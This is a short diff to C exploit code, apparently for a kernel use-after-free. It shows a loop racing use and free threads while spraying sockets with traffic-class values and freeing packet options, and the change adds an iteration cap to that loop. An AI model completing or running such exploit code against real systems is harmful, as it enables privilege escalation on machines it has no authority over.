@@ -183,6 +183,8 @@ void trigger_uaf(struct opaque* o) {
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
 
+    int safety_counter = 0;
+
     while (1) {
         for (int i = 0; i < SPRAY_SIZE; i++)
             set_tclass(o->spray_sock[i], TCLASS_SPRAY);
@@ -194,6 +196,11 @@ void trigger_uaf(struct opaque* o) {
             free_pktopts(o->spray_sock[i]);
 
         nanosleep(NANOSLEEP_100US, NULL);
+
+        if (safety_counter++ > 50000) {
+            o->triggered = 1;
+            break;
+        }
     }
 
     o->triggered = 1;
